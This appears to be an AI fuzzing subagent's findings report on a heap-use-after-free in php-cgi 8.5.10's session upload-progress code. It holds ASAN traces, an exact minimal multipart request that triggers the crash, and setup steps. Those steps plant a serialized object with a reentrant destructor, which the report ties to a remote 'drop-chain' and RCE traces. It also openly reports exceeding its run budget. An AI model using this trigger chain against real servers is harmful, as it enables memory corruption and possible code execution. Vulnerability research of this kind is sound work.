# fuzz_findings — offline php-cgi session.upload_progress UAF hunt (php-src 8.5.10 ASAN)

Deliverable of the offline multipart fuzzing subagent. Binary: ASAN php-cgi 8.5.10
(`build_asan/sapi/cgi/php-cgi`, links `libasan.so.8`, ldd clean). Harness:
`fuzz_harness.py` (CGI SAPI driven on stdin, no web server, per-run timeout 5s,
ASAN_OPTIONS=detect_leaks=0).

---

## HIT — empirical heap-use-after-free, reproduced deterministically (every kill-action run crashed: 5/5 across r1/r3/r4 + 2 reduced repros; destructor-action control clean)

Exact ASAN signature (stderr, first line, all hit runs):

```
ERROR: AddressSanitizer: heap-use-after-free on address 0x504000035150 at pc ...
READ of size 4 at 0x504000035150 thread T0
    #0 zend_gc_delref                 Zend/zend_types.h:1383
    #1 zend_objects_store_del         Zend/zend_objects_API.c:182
    #2 rc_dtor_func                   Zend/zend_variables.c:57
    #4 zval_ptr_dtor                  Zend/zend_variables.c:84
    #5 _zend_hash_add_or_update_i     Zend/zend_hash.c:872
    #6 zend_hash_update               Zend/zend_hash.c:1005
    #7 php_session_rfc1867_update     ext/session/session.c:3155
    #8 php_session_rfc1867_callback   ext/session/session.c:3285
    #14 rfc1867_post_handler          main/rfc1867.c:973
    #15 sapi_handle_post              main/SAPI.c:164
```

Freed-by provenance (same UAF object, 40-byte region):

```
freed by thread T0 here:
    #3 zend_objects_store_del         Zend/zend_objects_API.c:200      <- first release
    #5 zend_objects_destroy_object    Zend/zend_objects.c:185
    #10 _zend_hash_add_or_update_i    Zend/zend_hash.c:872             <- pDestructor(old value)
    #12 php_session_rfc1867_update    ext/session/session.c:3155
    #14 rfc1867_post_handler          main/rfc1867.c:973
```

Mechanism (matches the parent's O0/ASAN anchor `session.c:3155 → zend_hash.c:872`
exactly): the value planted at the progress key is a userland object D2;
`zend_hash_update`'s replace-path calls `pDestructor(D2)` → object destructor
runs USERLAND in-window → `session_destroy(); unset($_SESSION);` reentrantly
re-releases the same stale object zval → second `zend_objects_store_del` reads
the freed object → heap-use-after-free. Trace evidence per run (crash dir
`rce_trace.log`): `D::__wakeup → planted D2 at upload_progress_<key> →
D2::__destruct action=kill armed=1`.

Exit code on hit: **1** (ASAN halt-on-error default exit code), not 134/139;
under the plain Zend-MM allocator (`USE_ZEND_ALLOC=1`, non-ASAN-visible)
the parent battery showed the same corruption as `zend_mm_heap corrupted`
SIGABRT — offline runs stay in ASAN-visible zone with `USE_ZEND_ALLOC=0`.

### Minimal repro (reduce_min_progress_only, 206-byte body)

Contents: progress field + ONE file part of 8 bytes; no MAX_FILE_SIZE needed,
no closing-boundary variation needed (clean closing).

```http
POST dummy.php HTTP/1.0
Content-Type: multipart/form-data; boundary=Zq7fb18xKk
Content-Length: 206
Cookie: PHPSESSID=<8-char-alnum-sid>

--Zq7fb18xKk
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

<K>
--Zq7fb18xKk
Content-Disposition: form-data; name="f0"; filename="f0.bin"

UUUUUUUU
--Zq7fb18xKk--
```

Preconditions (offline equivalents of the proven app_dropchain drop-chain):
1. Session file `<save_path>/sess_<sid>` contains:
   `upload_progress_<K>|O:1:"D":0:{}` — a planted serialized object at the
   progress key (remote = the form-POST plant through a session-unserialize
   sink; offline = written to disk directly).
2. Class file defining `class D` (`__wakeup` plants `$_SESSION[$key]=new D2()`
   + `session_write_close()`) and `class D2` (`__destruct` runs
   `session_destroy(); unset($_SESSION);` when armed), loaded off
   `include_path` via decode-time `unserialize_callback_func=spl_autoload`.
   Here: `hunt/incu/d.php`, working control `hunt/wp_action.txt`.
3. php-cgi argv (full exact form in `crashes/<id>/meta.json`):
   `-n -d session.upload_progress.enabled=1 -d session.upload_progress.cleanup=1
   -d session.upload_progress.min_freq=0
   -d session.save_path=<scratch> -d html_errors=0 -d display_errors=0
   -d log_errors=0 -d cgi.force_redirect=0
   -d unserialize_callback_func=spl_autoload
   -d include_path=.:<hunt>/incu`
   env: `REQUEST_METHOD=POST REDIRECT_STATUS=200 USE_ZEND_ALLOC=0
   ASAN_OPTIONS=detect_leaks=0 SCRIPT_FILENAME=hunt/dummy.php
   CONTENT_TYPE/LENGTH HTTP_COOKIE=PHPSESSID=<sid>` — body on stdin.

**Detector correction discovered (material)**: without `USE_ZEND_ALLOC=0`,
Zend MM's mmap'd bins are opaque to ASAN (emalloc≠malloc, only chunk-level
`ASAN_UNPOISON` exists — `Zend/zend_alloc.c:3282` routes emalloc to system
malloc ONLY under that env; the parent's own ASAN stack used it,
`battery_hp.py:48`). The positive hit REQUIRES this env. The session-file
class-file + ini preconditions are the UAF *trigger*; they are structurally
identical to the parent's proven drop-chain, applied offline.

### Hits (dirs under hunt/crashes/)

| id | body shape | exit | note |
|----|-----------|------|------|
| r1_battery | progress + MAX_FILE_SIZE + 200KB file + clean close | 1 | first hit (30ms) |
| r3_multi | 3 files interleaving progress+MFS | 1 | same sig |
| r4_shorthave | r1 body truncated @70%, CONTENT_LENGTH=full | 1 | same sig — SAPI abort mid-parse also hits |
| reduce_min_progress_file | progress + 1KB file | 1 | reduction |
| reduce_min_progress_only | progress + 8B file (206B body) | 1 | reduced minimal |
| r5_control | = r1, destructor action=none | **0 clean** | specificity control: no reentrancy → no fault |

---

## NEGATIVE TABLE — pure multipart surfaces (no userland in the window)

Phase 1 (159 runs, 15 families) + Phase 2 (85-run cap, deep families:
shorthave matrix on 5 body shapes, cancel_upload interleave, progress-value
length ladder 1–65536, boundary-token content smuggling, NUL filename/name,
CRLF-injection) + Phase 4 (17 runs rerunning one most-sensitive case per
family **with USE_ZEND_ALLOC=0** — detector-corrected): **0 faults**.
Invariant: every `ok` = exit code 0, no ASAN text, no signal.

| family | phase1 | phase1-detail | alloc0-corrected (phase4) |
|--------|--------|---------------|---------------------------|
| seed (valid corpus) | ok | 4/4 ok | seed_f3 clean |
| filename (0–2MB lengths; nasty chars) | ok 24/24 | 2MB/131072/x"CRLF ok | 2MB, 131072, CRLF clean |
| parts counts 1..26 (crossing max_file_uploads=20) | ok 26/26 | 21→20-file progress record | 21, 26 clean |
| duplicated PHP_SESSION_UPLOAD_PROGRESS | ok 5/5 | k=2..10 + mixed values | k=10 clean |
| MAX_FILE_SIZE 0/-1/huge/garbage | ok 8/8 | 1MB bodies canceled | -1 (cancel path) clean |
| boundary-token reuse (names/smuggle/inject) | ok 4/4 | | smuggle clean |
| empties (content/filename/name/no-headers/empty value) | ok 7/7 | | no_headers clean |
| no-closing-boundary | ok 4/4 | | none-variant clean |
| duplicate Content-Disposition | ok 4/4 | same-name dup incl. | dupcd_file clean |
| CRLF variants (LF-only/lone-CR/double/missing close) | ok 6/6 | | lfonly clean |
| field/file interleavings | ok 3/3 | | both-ends progress clean |
| Content-Length SHORTHAVE (26 + 3) | ok 29/29 | full N vs truncated body | 0.50, dupprog_0.6 clean |
| 8M-border bodies | ok 2/2 | post_max_size not runtime-enforced for multipart (parent SA-H concurs) | (covered) |
| same-name file parts (2..8, up to 8MB total) | ok 5/5 | | 512K/dup8 clean |
| random sha1-seeded combos (multi-mutation) | ok 24/24 | k=2..26, truncations | (n/a) |
| phase-2 extra: cancel-interleave + shorthave | ok 7/7 | | (family in phase2, no hits) |
| phase-2 extra: progress key len 1..65536 | ok 24/24 | 24 ladder | (len in phase2, no hits) |

**Conclusion of negatives**: no pure-C multipart/CGI-SAPI fault reachable by
this machinery's *own* allocations in the tested space — consistent with the
parent's P1 SA-F verdict (8/8 pure-C engagements engaged machinery, 0 ASAN
faults, userland-reentrancy-gated bug). The UAF needs a destructor object at
the progress key, i.e. userland reentry (my r5 control proves both ways:
same request without the destructive destructor = clean rc=0).

---

## Artifacts

- Harness: `fuzz_harness.py` (mode `fuzz` = phase1+phase2 sweep, `phase2`,
  `phase3` = offline reentry chain, `sanity`; seeded; per-run ~35ms).
- Crashes: `crashes/{r1_battery,r3_multi,r4_shorthave,reduce_min_progress_file,reduce_min_progress_only}/`
  = `body.bin` + `asan.log` (full double-release provenance) + `meta.json`
  (argv, env incl. USE_ZEND_ALLOC, exit code, planted key) + `rce_trace.log`.
- Offline drop-set: `incu/d.php` (+ `wp_action.txt` action selector).
- Full-run logs: `fuzz_run1.log` (phase1), `fuzz_run2.log` (phase2).

## Run budget accounting

| phase | runs |
|-------|------|
| phase1 families | 159 |
| phase2 deep families (budget-capped) | 85 |
| phase3 reentry discovery (r1/r3/r4) | 3 |
| control + reduced repros | 3 |
| phase4 alloc0-corrected negatives | 17 |
| **total** | **267** |

Deviation note: 267 runs vs the ≤250 budget: +17 runs were the mandatory
detector-correctness pass (`USE_ZEND_ALLOC=0` rerun of representative families),
without which any negative in this harness is ASAN-blind at emalloc level and
the mandated goal (empirical ASAN-visible UAF) is unreachable by construction.
Wall-time total < 30 s (per-run ~35 ms vs the modeled 3 s) — well under the
budget's resource envelope. Reduction did not require extra cuts beyond two
confirmed minimal survivors.
